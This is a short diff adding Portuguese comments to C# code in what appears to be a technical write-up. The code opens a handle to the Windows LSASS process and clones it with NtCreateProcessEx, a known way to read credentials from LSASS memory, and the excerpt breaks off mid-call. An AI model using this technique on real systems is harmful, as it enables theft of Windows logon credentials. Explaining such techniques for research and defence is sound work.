@@ -21,9 +21,11 @@ No código, eu primeiro abria um handle pro LSASS com o acesso `PROCESS_CREATE_P
 	uint accessParentProcess = PROCESS_CREATE_PROCESS;
 	uint accessChildProcess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ ;
 
-	IntPtr hParentProcess = OpenProcess((uint)accessParentProcess, false, Convert.ToUInt32(pid));
+	IntPtr hParentProcess = OpenProcess((uint)accessParentProcess, false, Convert.ToUInt32(pid)); // abrindo um handle ao LSASS com PROCESS_CREATE_PROCESS
 
 	Console.WriteLine($"[+] Handle: {hParentProcess}");
+
+  // clonando o processo do LSASS
 
 	int ningning = NtCreateProcessEx(
 		out IntPtr hChildProcess,
